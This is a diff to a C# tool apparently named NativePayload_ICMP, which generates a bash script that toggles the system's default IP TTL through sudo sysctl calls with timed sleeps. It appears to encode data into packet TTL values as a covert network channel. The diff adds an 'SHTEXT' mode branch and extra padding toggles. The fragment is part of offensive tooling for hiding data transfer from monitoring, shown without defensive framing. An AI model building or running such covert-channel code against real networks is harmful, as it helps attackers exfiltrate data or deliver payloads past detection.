@@ -156,16 +156,21 @@ namespace NativePayload_ICMP
                     Mycode.AppendLine("                                 sudo sysctl net.ipv4.ip_default_ttl=$str; sleep 3;");
                     Mycode.AppendLine("                                 fi");
                     Mycode.AppendLine("                              done");
-                    for (int i = 0;  i < 5 - args[1].Length % 5 ; i++)
+                    if (args[0].ToUpper() == "SHTEXT")
                     {
-                        if (args[1].Length % 5 == 0) break;
-                        Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=255; sleep 3;");
-                        Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=100; sleep 3;");
+                        for (int i = 0; i < 5 - args[1].Length % 5; i++)
+                        {
+                            if (args[1].Length % 5 == 0) break;
+                            Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=255; sleep 3;");
+                            Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=100; sleep 3;");
+                            Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=255; sleep 3;");
+                            Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=100; sleep 3;");
+                        }
+
                         Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=255; sleep 3;");
                         Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=100; sleep 3;");
                     }
-                    Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=255; sleep 3;");
-                    Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=100; sleep 3;");
+
                     Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=255;");
                     Mycode.AppendLine("echo \"Done.\";");                    
                    
